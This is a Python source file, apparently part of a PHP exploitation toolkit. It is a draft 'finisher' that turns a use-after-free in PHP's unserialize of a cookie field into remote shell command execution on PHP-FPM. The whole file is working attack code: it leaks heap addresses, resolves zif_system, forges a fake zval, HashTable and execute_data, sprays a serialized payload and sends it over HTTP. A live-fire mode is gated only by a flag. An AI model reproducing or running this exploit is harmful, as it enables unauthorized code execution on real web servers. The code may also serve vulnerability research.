#!/usr/bin/env python3
"""a7_longcmd_finisher - DRAFT alternate finisher to lift the a7 fpm RCE past
its 14-byte command cap, by swapping a7's object fire for the
fake-HashTable + fake-execute_data carrier.

STATUS: **DRAFT / NOT LIVE-VALIDATED.** The offline carrier construction is
byte-faithful to the carrier path (poc/primitives/dispatch/longcmd_carrier.py, independently verified vs
kengwang). The a7 *integration* (laying that carrier into a7's var_hash-UAF
reclaim and the zif_system resolution) is specified below but NOT yet proven on
a target, so the live fire is guarded behind --i-have-calibrated. Use --emit for
the offline carrier dump; wire + validate before trusting the live path.

WHY a7 NEEDS A NEW FINISHER (not a carrier constant tweak)
----------------------------------------------------------
a7's 14-byte cap is STRUCTURAL to its dispatch: it type-confuses
get_properties_for(obj) into system(obj), so arg1 is FIXED to the object pointer
and the command must sit at the object's start and terminate before obj->ce at
+16 (~14 usable bytes). There is no free arg1 to redirect.

The cookie over-read chain (same CVE-2026-109619) does NOT have this limit: it reclaims the
dangling value with a fake IS_ARRAY whose zend_array_destroy walks a fake
HashTable with pDestructor = zif_system; the fake HashTable's arData overlaps a
fake execute_data (E = S+0x20) whose arg1 (E+0x50 = 0x70) points at an EXTERNAL
fake zend_string in a separate large field -> up to ~1.7 KB command. Porting
that carrier to a7 means forging a7's dangling zval as IS_ARRAY -> carrier,
instead of IS_OBJECT -> get_properties_for.

a7 INTEGRATION DESIGN (what a validated version must do)
--------------------------------------------------------
1. Reclaim: a7's fire sprays 32x 280-byte strings over the 8 freed var_hash
   zvals (universal_remote_rce._fire_cmd). Forge the reclaimed dangling zval as
   IS_ARRAY (type 7), value = HT_ADDR, instead of IS_OBJECT (type 8).
2. Placement: the carrier is 384 B > the 280 B spray, so it cannot live inline
   in one spray slot. a7's transport is ONE urlencoded `cook=` serialize blob
   (NOT multipart), so the fake HashTable and the long-command field ride as TWO
   extra serialize STRING elements appended after the 32 reclaim sprays
   (build_longcmd_fire_payload). Point the forged zval at HT_ADDR = chunk+HT_OFF
   (the carrier element's landing) and the carrier's arg1 at CMD_ADDR =
   chunk+CMD_OFF (the CMD element's fake-string header). Both landings are
   REQUEST-SHAPE deterministic and, on fpm, WORKER-INVARIANT (chunk-base
   reasoning), so each is measured ONCE (gdb or a marker leak-probe).
3. Destructor: zend_array_destroy fires pDestructor at request teardown. Set
   pDestructor = zif_system (the INTERNAL php_exec handler), NOT libc system --
   the execute_data overlap hands zif_system a clean char* arg1. zif_system is a
   static (non-exported) symbol, so a7's .gnu_hash/.dynsym by-name resolve does
   NOT reach it. resolve_zif_system_via_function_table resolves it by an RW
   name-walk of EG.function_table (symbol_resolver.lookup_function_handler;
   mirrors lookup_class_table and ports functable_resolver's runtime offset
   derivations). NOTE (tested): the function_table walk is UNRELIABLE over a7's
   OWN read backend -- a7's echo-serialize sink has no server-side substr cap, so
   reading the large function_table over it crashes the worker where the capped
   var_hash_rw ArbRead backend (r2g) does not. resolve_zif_system therefore falls
   back to binbase + the per-build BUILTIN_OFFSETS zif_system vaddr, which a7-fpm
   /apache already carry in their offset seed (so this is not a new per-SAPI
   trust assumption); a7-cli, which is truly offset-free, has no such fallback.

Pure stdlib; safe under ``python3 -I``. Lab/analysis use only, on systems you own.
"""
from __future__ import annotations

import argparse
import importlib.util
import os
import struct
import sys

_HERE = os.path.dirname(os.path.abspath(__file__))


def _load(name, filename):
    path = os.path.join(_HERE, filename)
    spec = importlib.util.spec_from_file_location(name, path)
    mod = importlib.util.module_from_spec(spec)
    if _HERE not in sys.path:
        sys.path.insert(0, _HERE)
    spec.loader.exec_module(mod)
    return mod


# The carrier builders are byte-verified (verify_longcmd_carrier.py); reuse them
# verbatim rather than re-deriving the geometry here.
_longcmd = _load("longcmd_carrier", "primitives/dispatch/longcmd_carrier.py")
fake_string = _longcmd.fake_string
ht_external = _longcmd.ht_external
cmd_field_value = _longcmd.cmd_field_value
max_cmd_len = _longcmd.max_cmd_len

# The forged dangling zval must be a REFCOUNTED array (IS_ARRAY | IS_TYPE_REFCOUNTED
# << 8 = 0x107), not plain IS_ARRAY (7): request teardown frees the dangling value
# via zval_ptr_dtor, which calls zend_array_destroy (-> pDestructor = zif_system)
# only on the refcounted path. 0x0107 matches the proven apache_cookie_rce reclaim
# (forge_fire_body val.u1.type_info=0x0107).
IS_ARRAY_EX = 0x107


def build_longcmd_fields(chunk, ht_off, cmd_off, zif_system, full_cmd):
    """Return (forged_zval_bytes, ht_field_bytes, cmd_field_bytes) for the a7
    long-command fire. OFFLINE-CORRECT (carrier bytes); the OFFSETS and the
    reclaim wiring are the live-calibration part.

      forged_zval : the 16-byte zval a7's spray must write over the dangling
                    slot -> IS_ARRAY pointing at the external fake HashTable.
      ht_field    : a separate large field whose landing is chunk+ht_off; holds
                    the fake HashTable+execute_data (arg1 -> chunk+cmd_off).
      cmd_field   : a separate large field whose landing is chunk+cmd_off; holds
                    the external fake zend_string + the long command.
    """
    ht_addr = chunk + ht_off
    cmd_addr = chunk + cmd_off
    if isinstance(full_cmd, str):
        full_cmd = full_cmd.encode("latin-1")
    if len(full_cmd) > max_cmd_len():
        raise ValueError(f"command too long ({len(full_cmd)} B); max {max_cmd_len()}")

    forged = bytearray(16)
    struct.pack_into("<Q", forged, 0, ht_addr)      # zval.value.arr -> fake HT
    struct.pack_into("<I", forged, 8, IS_ARRAY_EX)  # zval.u1.type_info (refcounted)

    ht_field = ht_external(ht_addr, zif_system, cmd_addr)   # carrier, S=ht_addr
    cmd_field = cmd_field_value(full_cmd)
    return bytes(forged), ht_field, cmd_field


def resolve_zif_system_via_function_table(engine, eg, binbase):
    """Offset-free &zif_system for the IS_ARRAY carrier. zif_system is a static
    (non-exported) handler, so a7's .gnu_hash/.dynsym by-name resolve cannot
    reach it; walk EG.function_table by name instead. Delegates to the shared
    symbol_resolver.lookup_function_handler over a7's OWN read backend (the one
    that already resolves EG.class_table for the object fire). Returns
    &zif_system, or None if the walk misses. `engine` is the universal_remote_rce
    module (its _resolver carries a7's installed read backend).

    functable_resolver.FunctionTableWalker (verified on the var_hash_rw ArbRead
    backend, which r2g.php server-caps via substr(.,0,16384)) does NOT ride this
    backend directly: a7's `echo serialize($r)` sink emits the FULL forged-length
    string, so any read whose preceding qword is a pointer SIGSEGVs the worker
    (empirically: a direct-port probe's find_function_table returned None,
    128 crashes). lookup_function_handler reuses a7's anchor-sweep read discipline
    (as lookup_class_table does) and ports functable_resolver's offset-free
    derivations (function_table slot 0x1b0/0x1c8; handler field 0x48/0x58)."""
    handler, _fn = engine._resolver.lookup_function_handler(eg, "system", binbase)
    return handler


def build_longcmd_fire_payload(engine, forged16, ht_field, cmd_field):
    """Assemble a7's serialize fire payload for the IS_ARRAY carrier.

    a7's transport is ONE urlencoded `cook=` serialize blob (NOT multipart), so
    the 384 B carrier HashTable and the long-command field ride as two extra
    serialize STRING elements appended after the 32 reclaim sprays; their
    request-heap landings are chunk+ht_off / chunk+cmd_off (calibrated once). The
    stale-bucket zval in every spray is forged IS_ARRAY -> HT_ADDR (`forged16`,
    value@+0, type@+8) instead of IS_OBJECT, so at request teardown
    zval_ptr_dtor -> zend_array_destroy walks the carrier and fires
    pDestructor = zif_system with the external long command."""
    sl, sc = engine.SPRAY_LEN, engine.SPRAY_COUNT
    sp = bytearray(sl)
    sp[40:40 + 16] = forged16            # stale-bucket zval: value + IS_ARRAY type
    sp = bytes(sp)
    total = 1 + sc + 2 + 1
    parts = [f'i:0;{engine.C_PART}'.encode('latin-1')]
    for i in range(sc):
        parts.append(f'i:{i+1};s:{sl}:"'.encode('latin-1') + sp + b'";')
    parts.append(f'i:{sc+1};s:{len(ht_field)}:"'.encode('latin-1') + ht_field + b'";')
    parts.append(f'i:{sc+2};s:{len(cmd_field)}:"'.encode('latin-1') + cmd_field + b'";')
    parts.append(f'i:{sc+3};R:{engine.REF_BASE};'.encode('latin-1'))
    return b'a:' + str(total).encode() + b':{' + b''.join(parts) + b'}'


def resolve_zif_system(engine, eg, binbase, version=None, sapi=None):
    """Resolve &zif_system for the carrier. Try the offset-free function_table
    name-walk first; on a miss (see resolve_zif_system_via_function_table for why
    the walk is unreliable over a7's uncapped echo-serialize read), fall back to
    binbase + the per-build BUILTIN_OFFSETS zif_system vaddr. a7-fpm/apache
    already carry a per-build offset seed (a_off/copy_off/...), so the offset
    fallback is consistent for those SAPIs -- not a new trust assumption; a7-cli,
    which is truly offset-free, has no such fallback. Returns (addr, how) with
    how in {"functable","offset-table",None}."""
    addr = resolve_zif_system_via_function_table(engine, eg, binbase)
    if addr:
        return addr, "functable"
    if version:
        from common.offsets import load_offsets
        # load_offsets keys the SAPI table by the PHP_SAPI token, not the short
        # name: "fpm" -> "fpm-fcgi", "apache" -> "apache2handler" (else the cli
        # table is used, whose zif_system vaddr differs from the fpm/apache one).
        tok = {"fpm": "fpm-fcgi", "apache": "apache2handler",
               "cli": None}.get(sapi, sapi)
        try:
            off = load_offsets(version, tok)
            if off.get("zif_system"):
                return binbase + off["zif_system"], "offset-table"
        except Exception:
            pass
    return None, None


def fire_longcmd(host, port, path, binbase, full_cmd, ht_off, cmd_off, chunk=None,
                 zif_system=None, version="8.4.26", sapi="fpm", attempts=8,
                 i_have_calibrated=False, verbose=True):
    """Live long-command fire (a7 IS_ARRAY carrier). GUARDED: refuses unless
    i_have_calibrated=True, because ht_off/cmd_off are calibrated once per body
    shape (gdb or a marker leak) and the IS_ARRAY-reclaim-reaches-teardown
    behavior under a7's echo-serialize dispatch is not yet confirmed on a target.
    When fired it installs the a7 fpm transport, leaks the chunk (unless
    supplied), resolves eg + &zif_system, builds the IS_ARRAY reclaim payload with
    the external carrier/CMD string elements, and sends ONE request so request
    teardown runs zend_array_destroy -> zif_system(long_cmd). Returns a dict of
    the resolved state; verify the command effect OUT OF BAND."""
    if not i_have_calibrated:
        raise NotImplementedError(
            "a7_longcmd_finisher live fire is an UNVALIDATED draft. Confirm "
            "ht_off/cmd_off (worker-invariant, measure once), confirm the "
            "IS_ARRAY reclaim reaches teardown on the target's dispatch, then "
            "pass i_have_calibrated=True. Use --emit for the offline carrier and "
            "--resolve-only to exercise the live &zif_system resolution.")
    fpm = _load("fpm_route", "chains/fpm_route.py")
    fpm.install_fpm_patches(host, port, path, binbase)
    engine = fpm.remote_rce

    if chunk is None:
        for _ in range(attempts):
            hr = engine.heap_leak()
            if hr:
                chunk = hr & ~0x1FFFFF
                break
        if chunk is None:
            raise RuntimeError("heap_leak failed: no chunk base leaked")

    eg, _got = engine.gnu_hash_resolve(binbase, "executor_globals",
                                       "_GLOBAL_OFFSET_TABLE_")
    how = "supplied"
    if zif_system is None:
        zif_system, how = resolve_zif_system(engine, eg, binbase, version, sapi)
    if zif_system is None:
        raise RuntimeError("could not resolve &zif_system (function_table walk "
                           "and offset table both missed)")
    if verbose:
        print(f"[longcmd_finisher] chunk={chunk:#x} eg={eg:#x} "
              f"zif_system={zif_system:#x} ({how})")

    forged, htf, cmdf = build_longcmd_fields(chunk, ht_off, cmd_off, zif_system,
                                             full_cmd)
    payload = build_longcmd_fire_payload(engine, forged, htf, cmdf)
    out = engine.send_http(payload)
    if verbose:
        print(f"[longcmd_finisher] fire sent ({len(payload)} B payload); "
              f"response={'none/crash' if out is None else str(len(out)) + ' B'}")
    return {"chunk": chunk, "eg": eg, "zif_system": zif_system, "resolve": how,
            "ht_addr": chunk + ht_off, "cmd_addr": chunk + cmd_off,
            "payload_len": len(payload), "response": out}


def resolve_only(host, port, path, binbase, version="8.4.26", sapi="fpm",
                 attempts=8):
    """Live, UNGUARDED helper: install the a7 fpm transport, leak the chunk,
    resolve eg, and resolve &zif_system (function_table walk, then offset-table
    fallback). Prints and returns (zif_system, how). This exercises only the
    resolution deliverable -- no reclaim, no fire."""
    fpm = _load("fpm_route", "chains/fpm_route.py")
    fpm.install_fpm_patches(host, port, path, binbase)
    engine = fpm.remote_rce
    chunk = None
    for _ in range(attempts):
        hr = engine.heap_leak()
        if hr:
            chunk = hr & ~0x1FFFFF
            break
    eg, _got = engine.gnu_hash_resolve(binbase, "executor_globals",
                                       "_GLOBAL_OFFSET_TABLE_")
    zif, how = resolve_zif_system(engine, eg, binbase, version, sapi)
    print(f"[longcmd_finisher] chunk={chunk and hex(chunk)} eg={eg:#x} "
          f"zif_system={zif and hex(zif)} via={how}")
    return zif, how


def main(argv=None):
    ap = argparse.ArgumentParser(
        description=__doc__.splitlines()[0],
        formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--emit", action="store_true",
                    help="offline: dump the forged zval + carrier field hex, no network")
    ap.add_argument("--resolve-only", action="store_true",
                    help="live: resolve &zif_system (function_table walk, then "
                         "offset-table fallback) and print it; no reclaim/fire")
    ap.add_argument("--fire", action="store_true",
                    help="live: assemble + send the IS_ARRAY long-command fire "
                         "(requires --i-have-calibrated, --ht-off, --cmd-off)")
    ap.add_argument("--i-have-calibrated", action="store_true")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=8170)
    ap.add_argument("--path", default="/remote_app.php")
    ap.add_argument("--binbase", default=None, help="php-fpm PIE base, hex")
    ap.add_argument("--version", default="8.4.26")
    ap.add_argument("--sapi", default="fpm")
    ap.add_argument("--cmd", default="id")
    ap.add_argument("--chunk", default=None,
                    help="request-heap chunk base, hex; omit to auto-leak (fire)")
    ap.add_argument("--ht-off", default="0x80000")
    ap.add_argument("--cmd-off", default="0x83000")
    ap.add_argument("--zif-system", default="0x7f0000aaaa00")
    args = ap.parse_args(argv)

    if args.resolve_only:
        if not args.binbase:
            print("[longcmd_finisher] --resolve-only needs --binbase"); return 2
        zif, how = resolve_only(args.host, args.port, args.path,
                                int(args.binbase, 0), args.version, args.sapi)
        return 0 if zif else 1

    if args.fire:
        if not args.binbase:
            print("[longcmd_finisher] --fire needs --binbase"); return 2
        res = fire_longcmd(args.host, args.port, args.path, int(args.binbase, 0),
                           args.cmd, int(args.ht_off, 0), int(args.cmd_off, 0),
                           chunk=(int(args.chunk, 0) if args.chunk else None),
                           version=args.version, sapi=args.sapi,
                           i_have_calibrated=args.i_have_calibrated)
        print(f"[longcmd_finisher] fire result: {res}")
        return 0

    if args.emit:
        chunk = int(args.chunk, 0) if args.chunk else 0x7f0000000000
        forged, htf, cmdf = build_longcmd_fields(
            chunk, int(args.ht_off, 0), int(args.cmd_off, 0),
            int(args.zif_system, 0), args.cmd)
        print(f"[longcmd_finisher] DRAFT (offline). cmd={len(args.cmd)} B  "
              f"max={max_cmd_len()} B")
        print(f"[longcmd_finisher] forged dangling zval (IS_ARRAY): {forged.hex()}")
        print(f"[longcmd_finisher]   value->fake HT @ chunk+{int(args.ht_off,0):#x}")
        print(f"[longcmd_finisher] ht field  ({len(htf)} B) arg1 -> chunk+{int(args.cmd_off,0):#x}")
        print(f"[longcmd_finisher] cmd field ({len(cmdf)} B) fake zend_string @ "
              f"+{_longcmd.FAKE_OFF:#x}: {cmdf[_longcmd.FAKE_OFF:_longcmd.FAKE_OFF+24].hex()} ...")
        print("[longcmd_finisher] NOTE: live fire is guarded (NotImplementedError) "
              "until the reclaim + offsets are validated.")
        return 0

    print("[longcmd_finisher] DRAFT: live fire not validated. Use --emit for the "
          "offline carrier. See the module docstring for the integration spec.")
    return 2


if __name__ == "__main__":
    try:
        sys.exit(main())
    except KeyboardInterrupt:
        sys.exit(130)
